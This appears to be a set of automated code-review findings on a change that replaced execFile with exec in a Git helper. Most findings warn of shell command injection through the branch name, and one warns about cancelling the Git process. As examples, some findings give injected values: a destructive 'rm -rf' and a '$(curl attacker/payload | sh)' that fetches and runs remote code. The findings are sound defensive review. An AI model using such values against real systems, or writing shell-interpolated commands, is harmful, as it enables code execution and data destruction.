findings.title: [P1] Keep the branch name out of the shell command
findings.body: When `branch` contains shell syntax such as `HEAD; attacker-command`, `exec` executes it with the application's privileges. The previous `execFile("git", ["show", branch])` passed the branch as a single argument and avoided shell interpretation.

findings.title: [P2] Preserve cancellation of the actual Git process
findings.body:
`exec()` returns the shell process rather than `git`. On Windows, and shells that do not forward termination, calling `showBranch(branch).kill()` terminates only the shell while a long-running `git show` continues in the background and may keep inherited pipes open. The previous `execFile()` implementation returned and killed Git directly.

_Recommend validating this comment independently._

findings.title: [P1] Preserve argument-based execution to prevent shell command injection
findings.body:
`exec` interpolates `branch` into a shell command. A value such as `HEAD; attacker-command` executes the appended command with the process’s privileges whenever callers pass externally controlled branch input. `execFile("git", ["show", branch])` treated it as one argument.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch name out of the shell command
findings.body:
`exec` invokes a shell and interpolates the caller-supplied `branch` directly. Any untrusted value such as `main; rm -rf target` or `$(curl attacker/payload | sh)` executes arbitrary commands with the application’s privileges. The previous `execFile` implementation passed the branch as an isolated argument and was not shell-injectable.

_Recommend validating this comment independently._
